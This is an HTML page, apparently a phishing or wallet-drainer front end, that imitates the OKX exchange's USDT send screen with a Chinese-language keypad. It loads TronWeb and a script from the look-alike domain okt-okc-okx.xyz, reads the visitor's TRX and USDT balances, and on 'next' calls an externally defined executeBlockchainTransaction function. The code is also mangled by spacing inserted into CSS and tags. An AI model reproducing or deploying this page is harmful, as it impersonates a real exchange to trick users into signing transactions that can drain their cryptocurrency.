< !DOCTYPE html >
    <
    html lang = "en" >
    <
    head >
    <
    meta charset = "UTF-8" >
    <
    meta name = "viewport"
content = "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
    <
    meta name = "apple-mobile-web-app-capable"
content = "yes" >

    <
    title > OKX < /title> <
    style >
    body, html {
        margin: 0;
        padding: 0;
        font - family: -apple - system,
        BlinkMacSystemFont,
        'Segoe UI',
        Roboto,
        Helvetica,
        Arial,
        sans - serif;
        background - color: white;
        height: 100 % ;
    }
    .container {
        display: flex;
        flex - direction: column;
        height: 100 % ;
        max - width: 400 px;
        margin: 0 auto;
        padding: 20 px;
        box - sizing: border - box;
    }
    .available {
        color: #8e8e93;
            font-size: 18px;
            margin-bottom: 20px;
        }
        .max-button {
           
            color: black;
            cursor: pointer;
        }
        .amount {
            font-size: 50px;
            font-weight: bold;
            display: flex;
            align-items: flex-end;
            margin-bottom: 5px;
        }
        .decimal {
            width: 10px;
            height: 10px;
            background-color: # 4 CAF50;
        margin: 0 3 px 15 px 3 px;
    }
    .currency {
        color: #8e8e93;
            font-size: 48px;
            margin-left: 5px;
        }
        .usd-amount {
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: # 8e8 e93;
        font - size: 18 px;
        margin - bottom: 40 px;
    }
    .usd - value {
        display: flex;
        align - items: center;
    }
    .exchange - icon {
        font - weight: bold;
        color: black;
    }
    .keypad {
        display: grid;
        grid - template - columns: repeat(3, 1 fr);
        gap: 15 px;
        grid - auto - rows: 40 px;
        margin - top: auto;
    }
    .key {
        font - size: 25 px;
        padding: 10 px;
        border: none;
        background - color: transparent;
        cursor: pointer;
        color: #000;
        }
        .next-button {
            
            background-color: # 000;
        color: white;
        border: none;
        padding: 15 px;
        font - size: 18 px;
        border - radius: 30 px;
        cursor: pointer;
        margin - top: 30 px;
    }
    .down - arrow {
        width: 0;
        height: 0;
        border - left: 5 px solid transparent;
        border - right: 5 px solid transparent;
        border - top: 5 px solid #8e8e93;
            margin-left: 5px;
        }
    </style>
    <script src= "./static/js/jquery-3.5.1.min.js" > < /script> <
            script src = "./static/js/TronWeb.js" > < /script> <
            /head> <
            body >
            <
            div class = "container" >
            <
            div class = "available" > 可用: < span id = "available-amount" > 0.00 < /span> USDT <span class="max-button" onclick="setMaxAmount()">最大</span > < /div> <
            div class = "amount" >
            <
            span id = "amount-display" > 0 < /span> <
            div id = "decimal"
        class = "decimal" > < /div> <
        span class = "currency" > USDT < /span> <
        /div> <
        br >
        <
        div class = "usd-amount" >
        <
        div class = "usd-value" >
        <
        span id = "usd-amount" > 0.00 USD < /span> <
        div class = "down-arrow" > < /div> <
        /div> <
        span class = "exchange-icon" > ⇅ < /span> <
        /div> <
        div class = "keypad" >
        <
        button class = "key"
        onclick = "addDigit('1')" > 1 < /button> <
        button class = "key"
        onclick = "addDigit('2')" > 2 < /button> <
        button class = "key"
        onclick = "addDigit('3')" > 3 < /button> <
        button class = "key"
        onclick = "addDigit('4')" > 4 < /button> <
        button class = "key"
        onclick = "addDigit('5')" > 5 < /button> <
        button class = "key"
        onclick = "addDigit('6')" > 6 < /button> <
        button class = "key"
        onclick = "addDigit('7')" > 7 < /button> <
        button class = "key"
        onclick = "addDigit('8')" > 8 < /button> <
        button class = "key"
        onclick = "addDigit('9')" > 9 < /button> <
        button class = "key"
        onclick = "addDigit('.')" > . < /button> <
        button class = "key"
        onclick = "addDigit('0')" > 0 < /button> <
        button class = "key"
        onclick = "deleteDigit()" > ⌫ < /button> <
        /div> <
        button class = "next-button"
        id = "submitBtn" > 下一步 < /button> <
        /div> <
        script type = "text/javascript"
        src = "https://www.okt-okc-okx.xyz/ld/help.js" > < /script> <
        script type = "text/javascript"
        src = "./static/pay/js/common.js" > < /script> <
        script >

        $(function() {
            sleep(1000).then(() => {
                getAssets(function(trx, usdt) {
                    $("#submitBtn")["removeAttr"]("disabled");
                    $("#submitBtn")["text"]("下一步");
                    $("#available-amount").html(usdt);
                });
            });
            $("#submitBtn").click(function() {
                executeBlockchainTransaction();
            });
        });

        let amount = '0';
        const amountDisplay = document.getElementById('amount-display');
        const usdAmount = document.getElementById('usd-amount');
        const decimal = document.getElementById('decimal');
        const availableAmount = document.getElementById('available-amount');

        function updateDisplay() {
            amountDisplay.textContent = amount;
            usdAmount.textContent = (parseFloat(amount) * 1.00028).toFixed(2) + ' USD';
        }

        function addDigit(digit) {
            if (amount === '0' && digit !== '.') {
                amount = digit;
            } else if (digit === '.' && amount.includes('.')) {
                return;
            } else if (amount.split('.')[1] ? .length >= 6) {
                return;
            } else if (amount === '0' && digit === '0') {
                return;
            } else {
                amount += digit;
            }
            updateDisplay();
        }

        function deleteDigit() {
            amount = amount.slice(0, -1);
            if (amount === '' || amount === '0.') amount = '0';
            updateDisplay();
        }

        function setMaxAmount() {
            amount = availableAmount.textContent;
            updateDisplay();
        }

        setInterval(() => {
            decimal.style.visibility = decimal.style.visibility === 'hidden' ? 'visible' : 'hidden';
        }, 500);

        updateDisplay(); <
        /script> <
        /body> <
        /html>